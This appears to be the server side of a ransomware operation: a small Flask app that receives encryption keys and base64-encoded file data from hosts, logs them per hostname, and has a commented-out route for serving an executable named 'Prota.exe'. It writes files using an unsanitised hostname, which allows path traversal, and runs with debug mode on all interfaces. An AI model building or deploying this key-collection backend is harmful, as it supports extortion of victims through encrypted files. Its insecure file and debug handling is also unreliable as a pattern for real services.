from flask import Flask, request, redirect, jsonify, send_file
import json
import base64

res_path = "./results"

app = Flask(__name__)
app.secret_key = "secret key"

@app.route('/', methods=['POST'])
def recvkey ():
    resp = jsonify({})
    headers = request.headers

    try:
        jsons = json.loads(request.data)

        if (jsons == None):
            raise Exception('Data None')
        if "key" in jsons:
            with open('{}/{}.log'.format(res_path, jsons['hostname']), mode='w', encoding='latin-1') as f:
                f.write('Start encrypt - {}\n'.format(jsons['key']))
                f.close()
        elif "file" in jsons:
            with open('{}/{}.log'.format(res_path, jsons['hostname']), mode='a', encoding='latin-1') as f:
                f.write('{}\n'.format(base64.b64decode(jsons['file']).decode('latin-1')))
                f.close()
    except Exception as e:
        print(e)
        resp.status_code = 404
        return resp

    resp.status_code = 200
    return resp

# @app.route('/download', methods=['GET'])
# def download ():
#     resp = jsonify({})
#     return send_file('Prota.exe')


if __name__ == "__main__":
    app.run(host="0.0.0.0", port="45678", debug=True, use_reloader=False)

